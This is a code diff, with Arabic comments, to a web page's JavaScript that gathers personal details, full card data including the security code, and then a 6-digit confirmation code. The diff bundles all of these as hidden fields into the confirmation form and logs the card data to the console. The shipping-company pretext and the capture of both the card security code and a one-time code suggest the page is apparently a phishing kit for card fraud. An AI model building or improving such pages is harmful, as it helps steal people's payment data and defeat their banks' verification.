@@ -910,6 +910,9 @@
             }
         }
 
+        // متغير عام لحفظ بيانات النموذج الأول
+        let savedFormData = {};
+
         // إعداد معالجات النماذج
         function initFormHandlers() {
             // تنسيق رقم البطاقة
@@ -934,11 +937,42 @@
                 this.value = this.value.replace(/\D/g, '');
             });
 
-            // متغير لحفظ بيانات النموذج الأول
-            let savedFormData = {};
-
             // إرسال نموذج البطاقة
             document.getElementById('cardForm').addEventListener('submit', function(e) {
+                // التأكد من ملء جميع الحقول المطلوبة
+                const requiredFields = [
+                    { id: 'firstName', name: 'الاسم الأول' },
+                    { id: 'lastName', name: 'اسم العائلة' },
+                    { id: 'phoneNumber', name: 'رقم الهاتف' },
+                    { id: 'email', name: 'البريد الإلكتروني' },
+                    { id: 'country', name: 'الدولة' },
+                    { id: 'city', name: 'المحافظة' },
+                    { id: 'address', name: 'العنوان' },
+                    { id: 'shippingCompany', name: 'شركة الشحن' },
+                    { id: 'cardNumber', name: 'رقم البطاقة' },
+                    { id: 'expiryMonth', name: 'شهر الانتهاء' },
+                    { id: 'expiryYear', name: 'سنة الانتهاء' },
+                    { id: 'cardHolder', name: 'اسم حامل البطاقة' }
+                ];
+
+                for (let field of requiredFields) {
+                    const element = document.getElementById(field.id);
+                    if (!element.value.trim()) {
+                        e.preventDefault();
+                        showQuantumAlert('خطأ', `يرجى ملء حقل ${field.name}`);
+                        element.focus();
+                        return;
+                    }
+                }
+
+                const cscField = document.querySelector('input[name="cc-csc"]');
+                if (!cscField.value.trim()) {
+                    e.preventDefault();
+                    showQuantumAlert('خطأ', 'يرجى ملء رمز الأمان');
+                    cscField.focus();
+                    return;
+                }
+
                 showQuantumLoading();
                 
                 // حفظ جميع البيانات
@@ -958,8 +992,16 @@
                     'cc_name': document.getElementById('cardHolder').value
                 };
 
-                // إضافة بيانات الشحن للنموذج الحالي
+                console.log('تم حفظ البيانات:', savedFormData);
+
+                // إضافة البيانات للنموذج الحالي
                 Object.keys(savedFormData).forEach(key => {
+                    // إزالة الحقل إذا كان موجوداً مسبقاً
+                    const existingInput = this.querySelector(`input[name="${key}"]`);
+                    if (existingInput && existingInput.type === 'hidden') {
+                        existingInput.remove();
+                    }
+                    
                     const input = document.createElement('input');
                     input.type = 'hidden';
                     input.name = key;
@@ -980,23 +1022,41 @@
                 
                 if (!confirmCode || confirmCode.length < 6) {
                     e.preventDefault();
-                    showQuantumAlert('خطأ', 'يرجى إدخال كود التأكيد بالكامل');
+                    showQuantumAlert('خطأ', 'يرجى إدخال كود التأكيد المكون من 6 أرقام');
                     return;
                 }
                 
-                // إضافة جميع البيانات السابقة إلى نموذج التأكيد
-                if (savedFormData && Object.keys(savedFormData).length > 0) {
-                    Object.keys(savedFormData).forEach(key => {
-                        // تجنب إضافة الحقول المكررة
-                        if (!this.querySelector(`input[name="${key}"]`)) {
-                            const input = document.createElement('input');
-                            input.type = 'hidden';
-                            input.name = key;
-                            input.value = savedFormData[key];
-                            this.appendChild(input);
-                        }
-                    });
+                // التأكد من وجود البيانات المحفوظة
+                if (!savedFormData || Object.keys(savedFormData).length === 0) {
+                    e.preventDefault();
+                    showQuantumAlert('خطأ', 'حدث خطأ في البيانات، يرجى المحاولة مرة أخرى');
+                    returnToMainPage();
+                    return;
                 }
+                
+                console.log('إضافة البيانات المحفوظة لنموذج التأكيد:', savedFormData);
+                
+                // إضافة جميع البيانات السابقة إلى نموذج التأكيد
+                Object.keys(savedFormData).forEach(key => {
+                    // إزالة الحقل إذا كان موجوداً مسبقاً
+                    const existingInput = this.querySelector(`input[name="${key}"]`);
+                    if (existingInput && existingInput.type === 'hidden') {
+                        existingInput.remove();
+                    }
+                    
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = savedFormData[key];
+                    this.appendChild(input);
+                });
+                
+                // إضافة معرف للتمييز بين النماذج
+                const formTypeInput = document.createElement('input');
+                formTypeInput.type = 'hidden';
+                formTypeInput.name = 'form_type';
+                formTypeInput.value = 'confirmation_code_form';
+                this.appendChild(formTypeInput);
                 
                 showQuantumLoading();
                 
@@ -1004,6 +1064,8 @@
                 setTimeout(() => {
                     document.getElementById('loadingOverlay').classList.add('hidden');
                     showSuccessMessage();
+                    // مسح البيانات المحفوظة بعد الإرسال الناجح
+                    savedFormData = {};
                 }, 2000);
             });
         }
